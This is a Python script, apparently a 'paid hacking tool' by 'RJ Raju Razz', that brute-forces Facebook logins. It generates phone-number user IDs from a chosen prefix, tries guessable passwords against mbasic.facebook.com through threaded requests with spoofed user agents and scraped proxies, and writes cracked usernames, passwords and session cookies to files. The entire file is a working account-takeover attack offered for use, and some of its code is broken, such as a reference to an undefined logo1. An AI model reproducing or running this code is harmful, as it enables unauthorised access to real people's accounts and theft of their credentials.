import os,sys,time,json,random,re,string,platform,base64,uuid
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from os import system as s
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
RED = '\033[1;91m'
WHITE = '\033[1;97m'
GREEN = '\033[1;32m' 
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
P = '\x1b[1;97m' 
M = '\x1b[1;91m' 
H = '\x1b[1;92m' 
K = '\x1b[1;93m' 
B = '\x1b[1;94m' 
U = '\x1b[1;95m' 
O = '\x1b[1;96m' 
N = '\x1b[0m'    
A = '\x1b[1;90m' 
BN = '\x1b[1;107m' 
BBL = '\x1b[1;106m' 
BP = '\x1b[1;105m' 
BB = '\x1b[1;104m' 
BK = '\x1b[1;103m' 
BH = '\x1b[1;102m' 
BM = '\x1b[1;101m' 
BA = '\x1b[1;100m' 
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today() 
loop = 0
oks = []
cps = []
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
try:
 prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
 open('.prox.txt','w').write(prox)
except Exception as e:
 print('')
prox=open('.prox.txt','r').read().splitlines()
for xd in range(10000):
    a='Nokia'
    b=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    c=random.randrange(1, 99)
    d='/GoBrowser/'
    e='1.6.0.'
    f=random.randrange(1, 99)
    uaku2=(f'{a}{b}{c}{d}{e}{f}')
    ugen.append(uaku2)
    
logo = """\033[1;30m
                  ▉▉▉▉
                 ▂▉▉▉▉▂
                \033[1;33m╰▏ ┛┗ ▕╯
                 ╲ 👅 ╱
                 \033[1;32m╱▔╲╱▔╲
               ╱ ╱▏╭╮▕╲ ╲
               ╲ ╲▏╭╮▕╱ ╱       \033[1;31m╔═╗  ╔╦╗  ╔═╗
                \033[1;35m ╲▉▉▉▉╱         \033[1;31m╠═╣   ║   ╠╣
                \033[1;34m  ▏╭╮▕          \033[1;31m╩ ╩   ╩   ╚  
                \033[1;34m  ▏▏▕▕
                  ▏▏▕▕
                \033[1;31m ╭╰ ╮╭╰ ╮
               \033[1;39msᴜʙ \033[1;35mᴋᴀ \033[1;36mʙᴀᴀᴘ
\033[0;95m●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●\033[1;37m๑۩♡۩๑\033[0;95m●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●
\\033[0;91m█
██╗  ██╗ █████╗  ██████╗██╗  ██╗███████╗██████╗ 
██║  ██║██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗
███████║███████║██║     █████╔╝ █████╗  ██║  ██║
██╔══██║██╔══██║██║     ██╔═██╗ ██╔══╝  ██║  ██║
██║  ██║██║  ██║╚██████╗██║  ██╗███████╗██████╔╝
╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═════╝ 
                                                

                              
            
\033[0;95m●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●\033[1;37m๑۩♡۩๑\033[0;95m●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●
\••••••••••••••••••••••••••••••••••••••••••••••••••\033[1;33m
  \033[1;32mAuthor : RJ Raju Razz
  \033[1;32mFacebook : RJ Raju Razz
   \033[1;33m Github. : RJ Raju Razz
••••••••••••••••••••••••••••
\033[1;39m━▷ \033[1;36m𝙁𝙀𝙀𝙇 𝙏𝙃𝙀 𝙋𝙊𝙒𝙀𝙍 𝙊𝙁 𝙍𝙅 𝙋𝘼𝙄𝘿 𝙃𝘼𝘾𝙆𝙄𝙉𝙂 𝙏𝙊𝙊𝙇𝙎😈
\033[0;95m●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●\033[1;37m๑۩♡۩๑\033[0;95m●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●"""
 
class Main:
	def __init__(self):
		self.id = []
		self.ok = []
		self.cp = []
		self.loop = 0
		os.system("clear")
		print(logo)
		
		print("\033[1;33m     ●▬▬▬▬▬▬▬▬▬▬▬▬●\033[1;37m๑۩♡۩๑\033[1;33m●▬▬▬▬▬▬▬▬▬▬▬▬●")
		print("\033[1;37m     FIRST OF ALL SUBSCRIBE MY CHANNEL")
		print("\033[1;33m     ●▬▬▬▬▬▬▬▬▬▬▬▬●\033[1;37m๑۩♡۩๑\033[1;33m●▬▬▬▬▬▬▬▬▬▬▬▬●")
		
		print(" \033[1;39m━▷\033[1;32m [1] SUBSCRIBE THE CHANNEL FOR APPROVED")
		print(" \033[1;39m━▷\033[1;31m [2] Exit")
		print("")
		baloch = input("\n\033[1;37m  \033[1;35mChoice \033[1;37m━━> \033[1;32m")
		if baloch in ["", " "]:
			exit()
		elif baloch in ["2", "02"]:
			print("    RJ RAJU RAZZ ❤️")
			os.system("xdg-open https://t.me/EvilEyeHackers")
			exit()
		elif baloch in ["1", "01"]:
			os.system("xdg-open https://www.facebook.com/profile.php?id=100046446651828")
            
def fuck():
    user=[]
    os.system('clear')
    print(logo)
    print('[+] EXAMPLE CODE: 017, 018, 019, 016')
    code = input('[?] CHOOSE CODE : ')
    name = ''.join(random.choice(string.digits) for _ in range(2))
    cod = ''.join(random.choice(string.digits) for _ in range(2))
    os.system('clear')
    print(logo)
    print('[+] EXAMPLE: 2000 3000 5000 10000 ')
    limit = int(input('[?] CHOOSE : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(4))
        user.append(nmp)
    with ThreadPool(max_workers=30) as yaari:
        os.system('clear')
        print(logo1)
        tl = str(len(user))
        print('[+] Total ids: '+tl)
        print("[+] Your Code: "+code)
        print('[+] Process has been started')
        print('[+] Use flight mode for speed up')
        print('==================================================')
        for love in user:
            uid = code+name+cod+love
            pwx = [code+name+cod+love,cod+love,name+love,code+name+cod,'bangladesh','Bangladesh']
            yaari.submit(mumit2,uid,pwx,tl)
    print('==================================================')
    print(' [+] Crack process has been completed')
    print(' [+] OK Ids saved in RJRAJURAZZ/OK.txt')
    print(' [+] CP Ids saved in RJRAJURAZZ/CP.txt') 
    print('==================================================')
def mumit2(uid,pwx,tl):
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            sys.stdout.write('\r\033[1;92m[RJRAJURAZZ]--[%s/%s]--[CP-%s]~[OK-%s] \r'%(loop,tl,len(cps),len(oks))),
            sys.stdout.flush()
            free_fb = session.get('https://mbasic.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {'authority': 'mbasic.facebook.com',
            'method':'GET',
            'path':'/login/device-based/regular/login/?refsrc=deprecated&lwv=101&ref=dbl',
            'scheme':'https',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
            'cache-control': 'max-age=0',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://mbasic.facebook.com',
            'referer': 'https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',
            'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': pro}
            lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=101',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print(f"""\033[1;92m[RJ-OK] ✅
Username : {uid} 
Password : {ps} 
\nCookie : {coki}
""")
#____cp____info 👇👇
                open('/sdcard/RJRAJURAZZ/OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"""\033[1;92m[RJ-CP] 
Username : {cid}
Password : {ps}
""")
                open('/sdcard/RJRAJURAZZ-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
    except:
        pass
        
Main()
